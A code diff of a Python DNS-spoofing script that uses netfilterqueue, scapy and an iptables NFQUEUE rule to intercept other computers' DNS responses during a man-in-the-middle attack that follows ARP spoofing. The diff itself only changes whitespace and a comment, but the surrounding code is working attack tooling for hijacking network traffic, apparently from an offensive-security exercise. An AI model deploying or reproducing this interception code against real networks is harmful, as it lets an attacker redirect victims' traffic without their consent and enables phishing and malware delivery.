@@ -4,6 +4,7 @@ import netfilterqueue
 import scapy.all as scapy
 import subprocess
 
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):  # IF has a DNS response...
@@ -27,12 +28,14 @@ def process_packet(packet):
 
     packet.accept()
 
+
 try:
     # Execute first the arp spoofer
     # To test with this computer: iptables -I OUTPUT -j NFQUEUE --queue-num 0;
     #                             iptables -I INTPUT -j NFQUEUE --queue-num 0;
 
-    # trap the incoming packets to a queue: iptables -I FORDWARD -j queue-num 0
+    # trap the incoming packets to a queue that come from other computers while mitm:
+    # iptables -I FORDWARD -j queue-num 0
     subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
